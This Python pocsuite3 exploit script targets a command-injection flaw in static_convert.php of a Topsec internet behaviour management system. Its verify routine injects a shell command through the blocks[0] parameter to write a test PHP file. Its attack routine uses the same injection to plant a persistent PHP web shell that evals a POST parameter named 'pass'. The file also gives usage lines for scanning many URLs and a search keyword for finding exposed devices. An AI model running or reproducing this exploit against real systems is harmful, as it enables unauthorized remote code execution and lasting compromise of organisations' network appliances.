from collections import OrderedDict
import re,random,hashlib,base64
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder



class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = ''  # PoC 的作者
    vulDate = '2022-07-28'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-07-28'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-07-28'  # PoC 更新日期 (%Y-%m-%d)
    references = []  # 漏洞来源地址，0day 不用写
    name = '天融信-上网行为管理系统static_convert.php命令执行漏洞'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.topsec.com.cn'  # 漏洞厂商主页地址
    appName = '天融信-上网行为管理系统'  # 漏洞应用名称
    appVersion = ''  # 漏洞影响版本
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '天融信-上网行为管理系统static_convert.php命令执行漏洞'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''
        天融信上网行为管理系统static_convert.php命令执行
    # usage : 
        pocsuite -r pocs/trx_behaviorsystem_rcee.py -f urls.txt --verify
        pocsuite -r pocs/trx_behaviorsystem_rce.py -f urls.txt --attack
        pocsuite -r pocs/trx_behaviorsystem_rce.py -u http://192.168.3.8 --verify
        pocsuite -r pocs/trx_behaviorsystem_rce.py -u http://192.168.3.8 --attack
    # keyword : 
        app="天融信-上网行为管理系统"

    '''

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}

        str_num = str(random.randint(1000000000,9999999999))
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        path="/view/IPV6/naborTable/static_convert.php?blocks[0]=|echo '<?php echo md5({num});unlink(__FILE__);?>' >>/var/www/html/{name}.php".format(num=str_num,name=str_num)
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }

        resp = requests.get(self.url + path, headers=headers,timeout=10)

        resq_verify = requests.get(url=self.url + '/' + str_num+'.php',headers=headers,timeout=5)
        if resp.status_code == 200 and  str_md5 in resq_verify.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + '/' + str_num+'.php'

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}

        filename = random_str(6) + ".php"
        # print(filename)
        path="""/view/IPV6/naborTable/static_convert.php?blocks[0]=|echo "<?php echo 'happy day';eval(\$_POST[pass]);?>" >> /var/www/html/{}""".format(filename)
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }

        resp = requests.get(self.url + path, headers=headers,timeout=10)
        if "happy day" in requests.get(url=self.url + "/" + filename).text:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + "/" + filename
            result['ShellInfo']['Content'] = '<?php echo "happy day";@eval($_POST["pass"]);?>'
        
        return self.parse_output(result)



register_poc(DemoPOC)

